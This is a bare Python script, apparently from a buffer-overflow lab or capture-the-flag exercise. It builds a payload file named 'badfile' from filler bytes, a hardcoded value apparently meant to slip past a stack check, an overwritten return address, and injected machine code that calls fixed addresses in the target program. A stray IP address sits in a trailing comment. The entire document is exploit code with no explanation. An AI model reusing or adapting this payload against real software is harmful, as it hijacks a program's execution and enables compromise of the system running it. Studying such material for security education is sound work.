function = b"\xBB\x6D\x62\x55\x56\xFF\xD3\xBB\xAF\x62\x55\x56\xFF\xD3\xBB\xE1\x62\x55\x56\xFF\xD3"

def p32(x):
    return x.to_bytes(4, "little")

with open("badfile", "wb") as f:
    f.write(
        b'A' * 480 +
	p32(0xDEADF0AD)+
	b'A' * 12 +
        p32(0xffffd0c0) +
	function +
        b'\x00'
    )



'''
20.120.240.161i
'''